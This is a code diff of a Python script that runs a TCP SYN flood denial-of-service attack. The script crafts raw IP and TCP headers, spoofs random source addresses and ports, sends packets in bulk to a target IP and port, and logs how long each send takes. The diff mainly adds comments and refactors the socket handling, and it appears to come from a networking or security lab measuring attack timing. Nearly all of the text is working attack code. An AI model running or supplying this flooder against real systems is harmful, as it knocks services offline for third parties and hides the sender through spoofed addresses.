@@ -49,15 +49,15 @@ def create_tcp_header(src_port, dst_port):
     tcp_ack = 0
     tcp_urg = 0
     tcp_window = socket.htons(5840) # maximum allowed window size
-    tcp_check = 0                   # checksum
+    tcp_check = 0                   # checksum is 0 for now - will be calculated later
     tcp_urg_ptr = 0
 
-    tcp_offset_res = (tcp_doff << 4) + 0
-    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+    tcp_offset_res = (tcp_doff << 4) + 0    # TCP offset and reserved bits
+    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)    # TCP flags (6 bits)
 
     tcp_header = struct.pack('!HHLLBBHHH',
                              tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
-                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)   # Construct the TCP header
 
     return tcp_header
 
@@ -65,31 +65,25 @@ def create_tcp_header(src_port, dst_port):
     Function to send a SYN flood attack to a target IP and port
     iterations: number of packets to send (used for logging)
 '''
-def syn_flood(target_ip, target_port, num_packets, iterations):
+def syn_flood(s: socket.socket,target_ip, target_port, num_packets, iterations):
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-    except socket.error as e:
-        print(f"Error creating socket: {e}")
-        return
-
-    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-
-    try:
-        with open("syns_results_p.txt", "a+") as log_file:
+        with open("syns_results_p.txt", "a+") as log_file:  # Open the log file in append mode to log the results
             for i in range(num_packets):
+                # Randomize the source IP and port
                 src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                 src_port = random.randint(1024, 65535)
 
                 ip_header = create_ip_header(src_ip, target_ip)
                 tcp_header = create_tcp_header(src_port, target_port)
 
-                packet = ip_header + tcp_header
+                packet = ip_header + tcp_header   # Construct the packet from the IP and TCP headers
 
                 start_time = time.time()
                 if(s.sendto(packet, (target_ip, 0)) < 0):
-                    print("Error sending packet")
+                    print("Error sending packet") # Inform the user if there was an error sending the packet. But won't stop the attack
                 end_time = time.time()
 
+                # Calculate the time taken to send the packet and log it
                 send_time = end_time - start_time
                 send_time_ms = send_time * 1000
                 log_file.write(f"{iterations + i} {send_time_ms:.3f} ms\n")
@@ -98,7 +92,6 @@ def syn_flood(target_ip, target_port, num_packets, iterations):
     except IOError as e:
         print(f"Error opening file: {e}")
         return
-    s.close()
 
 
 if __name__ == "__main__":
@@ -116,12 +109,22 @@ if __name__ == "__main__":
     except IOError as e:
         print(f"Error opening file: {e}")
 
-    start_time = time.time()    # Start time of the attack
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            start_time = time.time()    # Start time of the attack
+            for i in range(NUM_ITERATIONS):     # Send NUM_PACKETS packets in NUM_ITERATIONS iterations
+                syn_flood(s,TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)  # each iteration sends NUM_PACKETS packets
+                iterations += NUM_PACKETS
+            
+            end_time = time.time()    # End time of the attack
 
-    for i in range(NUM_ITERATIONS):     # Send NUM_PACKETS packets in NUM_ITERATIONS iterations
-        syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)  # each iteration sends NUM_PACKETS packets
+    except socket.error as e:
+        print(f"Error creating socket: {e}")
+        exit(e.errno)
 
-    end_time = time.time()    # End time of the attack
+    # Calculate the total time taken and average time per packet
     total_time = end_time - start_time
     total_time_ms = total_time * 1000
     average_time_per_packet_ms = (total_time / (NUM_PACKETS * NUM_ITERATIONS)) * 1000
